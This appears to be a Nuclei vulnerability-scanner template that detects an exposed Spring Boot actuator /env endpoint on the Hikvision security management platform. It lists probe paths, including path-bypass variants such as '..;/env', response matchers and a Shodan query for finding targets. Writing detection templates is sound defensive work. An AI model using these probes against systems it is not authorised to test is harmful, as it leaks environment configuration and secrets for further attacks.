http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - applicationConfig
    - activeProfiles
  - condition: or
    part: body
    type: word
    words:
    - server.port
    - local.server.port
  - condition: or
    part: header
    type: word
    words:
    - application/json
    - application/vnd.spring-boot.actuator
    - application/vnd.spring-boot.actuator.v1+json
    - application/vnd.spring-boot.actuator.v2+json
    - application/vnd.spring-boot.actuator.v3+json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/artemis/env'
  - '{{BaseURL}}/artemis-portal/artemis/env'
  - '{{BaseURL}}/artemis/actuator/env'
  - '{{BaseURL}}/artemis;/env;'
  - '{{BaseURL}}/artemis/1/..;/env'
  stop-at-first-match: true
id: hikvision-env
info:
  author: SleepingBag945
  description: 'The HIKVISION comprehensive security management platform has information
    leakage vulnerabilities, through which attackers can obtain sensitive information
    such as environment env for further attacks

    '
  metadata:
    max-request: 5
    shodan-query: "app=\"HIKVISION-\u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\u53F0\
      \""
    verified: true
  name: Hikvision Springboot Env Actuator - Detect
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/HIKVISION/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20env%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
  - "https://peiqi.wgpsec.org/wiki/iot/HIKVISION/HiKVISION%20\u7EFC\u5408\u5B89\u9632\
    \u7BA1\u7406\u5E73\u53F0%20env%20\u4FE1\u606F\u6CC4\u6F0F\u6F0F\u6D1E.html"
  severity: high
  tags: misconfig,hikvision,springboot,env,vuln
